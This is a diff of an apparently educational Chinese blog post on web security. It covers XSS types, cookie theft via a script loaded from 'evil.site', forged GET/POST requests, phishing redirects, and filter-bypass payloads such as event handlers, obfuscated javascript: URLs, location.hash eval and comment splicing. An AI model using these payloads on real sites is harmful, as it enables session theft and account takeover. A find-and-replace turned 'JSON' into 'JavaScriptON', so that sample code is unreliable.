@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://example.com/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p2.jpg">
 <meta property="og:image" content="http://example.com/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p3.jpg">
 <meta property="article:published_time" content="2024-02-28T09:02:44.000Z">
-<meta property="article:modified_time" content="2024-02-28T12:57:08.146Z">
+<meta property="article:modified_time" content="2024-03-02T08:40:46.957Z">
 <meta property="article:author" content="kawa_von">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary_large_image">
@@ -201,7 +201,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.7k 字
+      6.1k 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      23 分钟
+      51 分钟
     </span>
   
 
@@ -247,7 +247,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2024年2月28日 晚上
+                  本文最后更新于：2024年3月2日 下午
                 
               </p>
             
@@ -270,23 +270,23 @@
 <p>  反射型 XSS 也被称为“<strong>非持久型 XSS</strong>”，因为其 Payload 并<strong>未持久存储于服务端应用</strong>中，<strong>每次</strong>实施攻击都需要受害者访问带 Payload 的 URL。</p>
 <p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p1.jpg" srcset="/img/loading.gif" lazyload></p>
 <h4 id="存储型-XSS-攻击"><a href="#存储型-XSS-攻击" class="headerlink" title="存储型 XSS 攻击"></a>存储型 XSS 攻击</h4><p>  在存储型 XSS 攻击中，服务端应用<strong>将攻击者提交的恶意代码存储在服务端</strong>，受害者每次访问一个“干净”的 URL 时，服务端会在相应页面中嵌入之前存储的恶意代码，这些恶意代码将在受害者客户端执行。由于<strong>不需要在受害者的请求中夹带恶意代码</strong>，故<strong>此种攻击更稳定，危害性也更大</strong>。</p>
-<p>  例如：一个博客系统中存在该类漏洞，攻击者可以写一篇包含恶意 JS 代码的博客文章，当其余用户浏览攻击者发布的博客时，该恶意代码就会执行。</p>
+<p>  例如：一个博客系统中存在该类漏洞，攻击者可以写一篇包含恶意 JavaScript 代码的博客文章，当其余用户浏览攻击者发布的博客时，该恶意代码就会执行。</p>
 <p>  存储型 XSS 漏洞也可能出现在一些更隐蔽、影响面更大的场景中，如社交网站中的个人简介、签名，甚至是昵称。如果网站没有相应的安全策略，就有可能产生这样的漏洞。</p>
 <p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p2.jpg" srcset="/img/loading.gif" lazyload></p>
-<h4 id="基于-DOM-的-XSS-攻击"><a href="#基于-DOM-的-XSS-攻击" class="headerlink" title="基于 DOM 的 XSS 攻击"></a>基于 DOM 的 XSS 攻击</h4><p>  前两种攻击方法都是与服务端应用的处理逻辑有关系的，恶意 JS 代码在 HTTP 请求中被视为服务端的输入，并且被嵌入返回的 HTML 页面。但是正常应用中的 JS 程序也可以接受外部的输入数据，并直接在客户端渲染和执行，如果处理不当，它就可能将外部数据当代码来执行。</p>
-<p>  即利用当前页面本身的 JS 代码缺陷，进行恶意代码执行，而不是服务端返回恶意代码给到客户端执行，所以这种攻击称为基于 DOM 的 XSS 攻击。</p>
+<h4 id="基于-DOM-的-XSS-攻击"><a href="#基于-DOM-的-XSS-攻击" class="headerlink" title="基于 DOM 的 XSS 攻击"></a>基于 DOM 的 XSS 攻击</h4><p>  前两种攻击方法都是与服务端应用的处理逻辑有关系的，恶意 JavaScript 代码在 HTTP 请求中被视为服务端的输入，并且被嵌入返回的 HTML 页面。但是正常应用中的 JavaScript 程序也可以接受外部的输入数据，并直接在客户端渲染和执行，如果处理不当，它就可能将外部数据当代码来执行。</p>
+<p>  即利用当前页面本身的 JavaScript 代码缺陷，进行恶意代码执行，而不是服务端返回恶意代码给到客户端执行，所以这种攻击称为基于 DOM 的 XSS 攻击。</p>
 <p>  例如：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;URL&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;URL&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-built_in">decodeURI</span>(location.<span class="hljs-property">herf</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>  JS 代码将当前页面的 URL 当作 HTML 代码插入网页，此时如果 URL 中含有 HTML 标签，就将在当前网页产生新的 DOM 节点，通过特定标签可以引入 JS 代码并执行。</p>
+<p>  JavaScript 代码将当前页面的 URL 当作 HTML 代码插入网页，此时如果 URL 中含有 HTML 标签，就将在当前网页产生新的 DOM 节点，通过特定标签可以引入 JavaScript 代码并执行。</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8000</span>/domxss.html?&lt;img src=<span class="hljs-number">0</span> onerror=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>  访问此 URL 后，浏览器将执行 URL 中指定的 JS 弹窗代码。此案例看起来很像反射型 XSS ，但是它和反射型 XSS 有着本质的区别，因为服务端返回的 HTML 源码中并没有相应的弹窗代码，弹框代码是客户端原有页面的 JS 代码在执行过程中引入的。它本质上是前端 JS 的漏洞，而不是服务端程序的漏洞。</p>
+<p>  访问此 URL 后，浏览器将执行 URL 中指定的 JavaScript 弹窗代码。此案例看起来很像反射型 XSS ，但是它和反射型 XSS 有着本质的区别，因为服务端返回的 HTML 源码中并没有相应的弹窗代码，弹框代码是客户端原有页面的 JavaScript 代码在执行过程中引入的。它本质上是前端 JavaScript 的漏洞，而不是服务端程序的漏洞。</p>
 <p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p3.jpg" srcset="/img/loading.gif" lazyload></p>
 <h4 id="Self-XSS-攻击"><a href="#Self-XSS-攻击" class="headerlink" title="Self-XSS 攻击"></a>Self-XSS 攻击</h4><p>  这个类型的 XSS 攻击与前面几种手法不太一样，Self-XSS 是利用社会工程学欺骗用户，让他们复制恶意代码并粘贴到浏览器中，所以称为“Self-XSS”攻击。</p>
-<p>  但是现在大部分浏览器都有一定的防御措施，如地址栏不支持或不允许粘贴 JS 伪协议的 URL，这种攻击也就失效了。</p>
+<p>  但是现在大部分浏览器都有一定的防御措施，如地址栏不支持或不允许粘贴 JavaScript 伪协议的 URL，这种攻击也就失效了。</p>
 <h3 id="XSS-攻击进阶"><a href="#XSS-攻击进阶" class="headerlink" title="XSS 攻击进阶"></a>XSS 攻击进阶</h3><p>  最常见的 XSS Payload 是通过读取浏览器的 Cookie 对象而发起“Cookie 劫持”攻击的。由于 Web 应用通常用 Cookie 作为用户的身份凭证，如果一个用户的 Cookie 被攻击者获取，意味着攻击者获得了该用户的身份。</p>
-<p>  通常，为了实现复杂的攻击逻辑，可以将 Payload 放在一个 JS 文件中， 然后通过&lt;script&gt;标签载入，这样就可以避免在 URL 中写入大量的代码：</p>
+<p>  通常，为了实现复杂的攻击逻辑，可以将 Payload 放在一个 JavaScript 文件中， 然后通过&lt;script&gt;标签载入，这样就可以避免在 URL 中写入大量的代码：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span><span class="hljs-regexp">/echo.php?name=&lt;script src=&quot;http:/</span><span class="hljs-regexp">/evil.site/</span>evil.js<span class="hljs-string">&quot;&gt;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>  在 evil.js 中，可以通过如下代码读取 Cookie 并将其发送到远程服务器上：</p>
@@ -294,12 +294,75 @@
 
 <p>  这段代码将 Cookie 作为参数填到一个攻击者指定的 URL 中，然后将 URL 作为一个图像的 src 属性，浏览器向攻击者指定网站（evil.site）发送尝试获取图像请求，实则是将受害者的 Cookie 发送到其指定网站。</p>
 <p>  攻击者获得 Cookie 之后，则可将其填入自己的浏览器，以受害者身份访问应用。</p>
-<h4 id="构造-GET-和-POST-请求"><a href="#构造-GET-和-POST-请求" class="headerlink" title="构造 GET 和 POST 请求"></a>构造 GET 和 POST 请求</h4><p>  Web 应用通常是通过发送 GET 和 POST 请求与服务端交互的， XSS 攻击能实现在受害者浏览器中执行任意 JS 代码，所以攻击者可以通过 JS 让受害者发送 GET 或 POST 请求来执行 Web 应用中的功能。如博客的发表、删除和点赞等等。</p>
+<h4 id="构造-GET-和-POST-请求"><a href="#构造-GET-和-POST-请求" class="headerlink" title="构造 GET 和 POST 请求"></a>构造 GET 和 POST 请求</h4><p>  Web 应用通常是通过发送 GET 和 POST 请求与服务端交互的， XSS 攻击能实现在受害者浏览器中执行任意 JavaScript 代码，所以攻击者可以通过 JavaScript 让受害者发送 GET 或 POST 请求来执行 Web 应用中的功能。如博客的发表、删除和点赞等等。</p>
 <p>  关于构造 GET 请求，最简单的办法就是创建 Image 对象， 将其 src 属性指定为目标 URL，这样浏览器在获取图像时，就在当前页面发送了 GET 请求。</p>
 <p>  如：</p>
 <figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-type">Image</span>();<br>img.src = <span class="hljs-string">&#x27;http://blog.example.com/del?id=123&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p>  在更多场景里，执行特定功能的操作是通过 POST 请求来实现的。使用 JS 发送 POST 请求也很简单，有两种方法可以做到。</p>
+<p>  在更多场景里，执行特定功能的操作是通过 POST 请求来实现的。使用 JavaScript 发送 POST 请求也很简单，有两种方法可以做到。</p>
+<p>  对于提交表单的操作，可以使用 JavaScript 创建一个表单对象，填充表单中的字段，然后提交。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> <span class="hljs-keyword">form</span> = document.createElement(&#x27;<span class="hljs-keyword">form</span>&#x27;);<br><span class="hljs-keyword">form</span>.method = &#x27;<span class="hljs-keyword">POST</span>&#x27;;<br><span class="hljs-keyword">form</span>.action = &#x27;http:<span class="hljs-comment">//blog.example.com/del&#x27;;</span><br><span class="hljs-keyword">var</span> il = document.createElement(<span class="hljs-string">&quot;input&quot;</span>);<br>il.name = &#x27;id&#x27;;<br>il.value = &#x27;123&#x27;;<br><span class="hljs-keyword">form</span>.appendChild(il);<br><span class="hljs-keyword">form</span>.submit();<br></code></pre></td></tr></table></figure>
+
+<p>  这种方式只能提交表单形式的请求。</p>
+<p>  对于更复杂的数据格式请求，需要用到 XMLHttpRequest 或 Fetch API，假如删除博客操作需要提交一个 JavaScriptON 格式的数据到服务端，代码如下：</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-type">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> json = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span> = <span class="hljs-string">&quot;123&quot;</span><br>&#125;;<br>xhr.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/del&#x27;</span>);<br>xhr.setRequestHeader(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.send(JavaScriptON.stringify(json));<br></code></pre></td></tr></table></figure>
+
+<h4 id="XSS-钓鱼"><a href="#XSS-钓鱼" class="headerlink" title="XSS 钓鱼"></a>XSS 钓鱼</h4><p>  很多论坛或即时聊天软件都有识别可信 URL 的功能，但如果白名单上的 URL 存在 XSS 漏洞，则攻击者可非常简单地通过 XSS 实现 URL 跳转：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://example.com/echo<span class="hljs-built_in">.name</span>.php<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://evil.site/&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>  如果受害者以为自己还在 example 这个域名内，很可能会输入账号密码等敏感数据。</p>
+<h4 id="XSS-攻击平台"><a href="#XSS-攻击平台" class="headerlink" title="XSS 攻击平台"></a>XSS 攻击平台</h4><p>如 BeEF（<a target="_blank" rel="noopener" href="https://beefproject.com/%EF%BC%89">https://beefproject.com/）</a></p>
+<h3 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h3><p>  XSS 蠕虫最早是由 Samy Kamkar 实现并传播，其在短短几小时内感染了百万名用户，它在每位用户的简介后加上了一句话：”but most of all, Samy is my hero.”，这是 Web 安全史上的第一个重量级 XSS 蠕虫，具有里程碑意义。</p>
+<p>  XSS 蠕虫一般利用存储型 XSS 漏洞，将攻击代码存放在个人签名、站内信上，被感染后执行好友间群发，以具有诱惑力的标题将受害者引入（例如：有人暗恋你哦，你想知道ta是谁吗），成为新的载体。</p>
+<h3 id="XSS-攻击技巧"><a href="#XSS-攻击技巧" class="headerlink" title="XSS 攻击技巧"></a>XSS 攻击技巧</h3><h4 id="基本变形"><a href="#基本变形" class="headerlink" title="基本变形"></a>基本变形</h4><p>  最简单的方式是改变字母的大小写。HTML 标签是大小写不敏感的。</p>
+<p>  如果安全过滤函数只是简单检测 &lt;script&gt; 特征，则可以使用空格、换行符等绕过检测，如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span></span><br><span class="hljs-tag">    &gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>  有些安全检测函数会删掉 script 标签，则提交如下 payload，在其过滤一次后，仍有有效标签：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;....<br></code></pre></td></tr></table></figure>
+
+<h4 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h4><p>  很多 HTML 节点都可以绑定事件处理程序，比如 img 标签，指定一个错误或不存在的 src 属性，载入图像失败时就会触发 onerror 事件：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(document.cookie);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>  还有很多类似的事件：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;object <span class="hljs-attribute">onerror</span>=alert(document.domain)&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=alert(document.domain)&gt;<br>&lt;video <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;<br>&lt;svg <span class="hljs-attribute">onload</span>=alert(document.domain)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>  构造不同的 HTML 标签并尝试使用不同的事件处理程序，可以绕过一些过滤不严格的安全防御机制。</p>
+<h4 id="JavaScript-伪协议"><a href="#JavaScript-伪协议" class="headerlink" title="JavaScript 伪协议"></a>JavaScript 伪协议</h4><p>  浏览器可以接受内联的 JavaScript 代码作为 URL。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sec</span>=<span class="hljs-string">javascript:alert(2)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>...<br></code></pre></td></tr></table></figure>
+
+<p>  一些安全功能会滤掉 JavaScript 伪协议，可尝试插入空白字符绕过：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java&amp;#13script&amp;#9:alert(document.domain)&quot;</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>  当开发者仅仅校验 host 是否为合法域名，而没有校验协议时：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">javascript</span>://example.com/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aalert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>  其中的”//example.com”被当作 JavaScript 代码的注释，所以整个代码都是合法可行的。</p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>  关于长度限制：</p>
+<p>  可以利用事件减少字节数，最好的办法是将 XSS Payload 写到别处，再通过简短的代码加载这段 XSS Payload。</p>
+<p>  最常用藏代码的地方就是“location.hash”。根据 HTTP 协议 ，location.hash 内的内容不会在 HTTP 请求中发送，所以服务端的 Web 日志并不会记录 location.hash 的内容，从而隐藏了攻击者的真实意图。</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">?<span class="hljs-keyword">var</span>=<span class="hljs-string">&quot; onclick=&quot;</span>evil(location.<span class="hljs-built_in">hash</span>.substr(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
+
+<p>  输出后的 HTML：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input value<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> onclick<span class="hljs-operator">=</span><span class="hljs-string">&quot;evil(location.hash.substr(1))&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>
+
+<p>  因为 location.hash 第一个字符为 #</p>
+<p>  所以构造的 XSS URL 为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/test.php?var=<span class="hljs-string">&quot;</span><br><span class="hljs-string">onclick=&quot;</span><span class="hljs-built_in">eval</span>(location.hash.substr(1))<span class="hljs-comment">#alert(1)</span><br></code></pre></td></tr></table></figure>
+
+<p>  当有多个变量值时，例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$email</span>&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;phone&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$phone</span>&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>  可以拼接代码，利用注释，将三行连成一句话。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?name=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-comment">/*&amp;email=*/</span><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)<span class="hljs-comment">/*&amp;phone=*/</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>  三个参数被拼接成完成的一句话：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;script&gt;/*&quot;&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;*/alert(document.domain)/*&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;phone&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;*/&lt;/script&gt;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>  其包含了完整的 JavaScript 代码，可以正常运行。</p>
+<h4 id="base-标签"><a href="#base-标签" class="headerlink" title="base 标签"></a>base 标签</h4><p>  base 标签用于定义该页面上，所有相对路径的 host 地址。</p>
+<p>  如果 base 标签被攻击者劫持，就可以在远程服务器上伪造图片、链接或脚本，劫持当前页面中所有使用“相对路径”的标签。</p>
+<p>  在设计 XSS 防御方案时，一定要过滤掉这个非常危险的标签。</p>
 
             </div>
             <hr>
